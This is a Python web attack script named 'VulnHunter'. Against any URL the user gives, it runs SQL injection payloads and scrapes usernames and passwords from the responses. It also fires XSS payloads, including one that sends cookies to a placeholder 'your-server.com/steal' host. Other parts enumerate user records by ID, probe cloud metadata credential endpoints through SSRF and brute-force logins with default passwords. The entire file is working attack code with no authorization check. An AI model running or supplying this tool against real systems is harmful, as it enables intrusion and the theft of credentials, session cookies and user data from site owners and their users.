import requests
from urllib.parse import urljoin
import re
from colorama import Fore, Style, init
from prettytable import PrettyTable

# Inicializa o Colorama para adicionar cores ao console
init()

# Informações do programa
program_name = "VulnHunter"
version = "v1.0"
creator = "Linux da Silva"

# Cabeçalhos para simular um navegador
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
}

# Payloads avançados do repositório payload-python
sql_injection_payloads = [
    "' OR '1'='1' --",
    "' OR '1'='1' #",
    "' OR '1'='1'/*",
    "' UNION SELECT null, username, password FROM users --",
    "' UNION SELECT null, null, null, username, password FROM users --",
    "' UNION ALL SELECT null, null, table_name, column_name FROM information_schema.columns --",
    "admin' --",
    "1' AND 1=CONVERT(int, (SELECT @@version))--",
    "1' OR 1=1--",
    "' AND (SELECT COUNT(*) FROM information_schema.tables) > 0 --",
    "' AND 1=2 UNION ALL SELECT table_name, column_name FROM information_schema.columns --",
    "' AND 1=2 UNION ALL SELECT table_name, column_name FROM information_schema.columns WHERE table_schema=DATABASE() --"
]

xss_payloads = [
    '<script>alert("XSS")</script>',
    '<img src=x onerror=alert("XSS")>',
    '<svg/onload=alert("XSS")>',
    '<iframe src="javascript:alert(\'XSS\')"></iframe>',
    '<input type="text" value="x" onfocus=alert("XSS") autofocus>',
    '"><img src="x" onerror="alert(1)">',
    '"><script>alert(1)</script>',
    '<script>document.body.innerHTML += "<img src=\'x\' onerror=\'alert(1)\'>" </script>',
    '<script>fetch("http://your-server.com/steal?cookie="+document.cookie)</script>',
]

directories = [".git/", ".env", "backup/", "config/", "phpinfo.php", "robots.txt"]

ssrf_payloads = [
    "http://169.254.169.254/latest/meta-data/",
    "http://localhost/",
    "http://127.0.0.1/",
    "http://metadata.google.internal/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://localhost:8080/admin",
    "http://localhost/admin",
    "http://127.0.0.1/admin",
]

login_payloads = [
    {"username": "admin", "password": "admin"},
    {"username": "admin", "password": "password"},
    {"username": "user", "password": "user"},
    {"username": "user", "password": "123456"},
    {"username": "admin", "password": "admin123"},
    {"username": "root", "password": "root"},
    {"username": "test", "password": "test"},
    {"username": "guest", "password": "guest"},
]

# Tabela para armazenar resultados
results_table = PrettyTable()
results_table.field_names = ["Type", "URL", "Data"]

# Função para adicionar uma linha na tabela de resultados
def add_result(type, url, data=""):
    # Limita o comprimento dos dados para exibição
    truncated_data = (data[:50] + '...') if len(data) > 50 else data
    results_table.add_row([type, url, truncated_data])

# Função para verificar diretórios e arquivos sensíveis
def check_directories_and_files(url):
    for directory in directories:
        test_url = urljoin(url, directory)
        response = requests.get(test_url, headers=headers)
        if response.status_code == 200:
            add_result("Sensitive Directory/File Found", test_url, response.text)

# Função para realizar ataques SQL Injection avançados e filtrar dados relevantes
def attack_sql_injection(url):
    for payload in sql_injection_payloads:
        test_url = urljoin(url, "?id=" + payload)
        response = requests.get(test_url, headers=headers)
        if response.status_code == 200:
            # Filtrar dados para encontrar apenas usernames e passwords
            usernames = re.findall(r"(?:username|user|login)[\s:]*([^\s]*)", response.text, re.IGNORECASE)
            passwords = re.findall(r"(?:password|pass|pwd)[\s:]*([^\s]*)", response.text, re.IGNORECASE)
            
            if usernames and passwords:
                for username, password in zip(usernames, passwords):
                    add_result("SQL Injection Attack", test_url, f"Username: {username}, Password: {password}")

# Função para realizar ataques XSS avançados
def attack_xss(url):
    for payload in xss_payloads:
        test_url = urljoin(url, "?q=" + payload)
        response = requests.get(test_url, headers=headers)
        if response.status_code == 200 and payload in response.text:
            add_result("XSS Attack", test_url, "Injected XSS payload.")

# Função para realizar ataques IDOR avançados
def attack_idor(url):
    for user_id in range(1, 50):
        idor_url = urljoin(url, f"?user_id={user_id}")
        response = requests.get(idor_url, headers=headers)
        if response.status_code == 200 and ("username" in response.text.lower() or "email" in response.text.lower()):
            add_result("IDOR Attack", idor_url, response.text)

# Função para realizar ataques SSRF avançados
def attack_ssrf(url):
    for payload in ssrf_payloads:
        test_url = urljoin(url, "?url=" + payload)
        response = requests.get(test_url, headers=headers)
        if response.status_code == 200 and re.search("meta-data|localhost|127.0.0.1", response.text):
            add_result("SSRF Attack", test_url, response.text)

# Função para testar SQL Injection
def test_sql_injection(url):
    for payload in sql_injection_payloads:
        test_url = urljoin(url, "?id=" + payload)
        response = requests.get(test_url, headers=headers)
        if "sql" in response.text.lower() or "syntax" in response.text.lower():
            add_result("SQL Injection detected", test_url)
            attack_sql_injection(url)  # Ataca após detectar

# Função para testar XSS
def test_xss(url):
    for payload in xss_payloads:
        test_url = urljoin(url, "?q=" + payload)
        response = requests.get(test_url, headers=headers)
        if payload in response.text:
            add_result("XSS detected", test_url)
            attack_xss(url)  # Ataca após detectar

# Função para testar IDOR
def test_idor(url):
    idor_url = urljoin(url, "?user_id=1")
    response = requests.get(idor_url, headers=headers)
    if response.status_code == 200 and ("user_id" in response.text.lower() or "username" in response.text.lower()):
        add_result("IDOR detected", idor_url)
        attack_idor(url)  # Ataca após detectar

# Função para testar SSRF
def test_ssrf(url):
    for payload in ssrf_payloads:
        test_url = urljoin(url, "?url=" + payload)
        response = requests.get(test_url, headers=headers)
        if response.status_code == 200 and re.search("meta-data|localhost|127.0.0.1", response.text):
            add_result("SSRF detected", test_url)
            attack_ssrf(url)  # Ataca após detectar

# Função para testar login (brute force)
def test_login(url):
    login_url = urljoin(url, "/login")  # Ajuste o caminho de login conforme necessário
    for payload in login_payloads:
        response = requests.post(login_url, data=payload, headers=headers)
        if "login" not in response.url.lower() and response.status_code == 200:
            add_result("Login Success", login_url, f"Username: {payload['username']}, Password: {payload['password']}")

# Função para exportar resultados para um arquivo de texto
def export_results_to_file(filename):
    with open(filename, 'w') as f:
        f.write(str(results_table))

if __name__ == "__main__":
    print(f"\n{Fore.YELLOW}{program_name} - Version: {version}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}Created by: {creator}{Style.RESET_ALL}\n")

    target_url = input("Enter the target URL: ")

    print(f"\n{Fore.CYAN}Checking for sensitive directories and files...{Style.RESET_ALL}")
    check_directories_and_files(target_url)

    print(f"\n{Fore.CYAN}Testing for SQL Injection...{Style.RESET_ALL}")
    test_sql_injection(target_url)

    print(f"\n{Fore.CYAN}Testing for XSS...{Style.RESET_ALL}")
    test_xss(target_url)

    print(f"\n{Fore.CYAN}Testing for IDOR...{Style.RESET_ALL}")
    test_idor(target_url)

    print(f"\n{Fore.CYAN}Testing for SSRF...{Style.RESET_ALL}")
    test_ssrf(target_url)

    print(f"\n{Fore.CYAN}Testing for login vulnerabilities...{Style.RESET_ALL}")
    test_login(target_url)

    print(f"\n{Fore.GREEN}Advanced attack testing complete.{Style.RESET_ALL}")
    print(results_table)
    
    # Exporta os resultados para um arquivo
    export_filename = "results.txt"
    export_results_to_file(export_filename)
    print(f"{Fore.GREEN}Results exported to {export_filename}.{Style.RESET_ALL}")
    
    print(f"\n{Fore.GREEN}Press Enter to exit.{Style.RESET_ALL}")
    input()  # Aguarda o usuário pressionar Enter antes de fechar
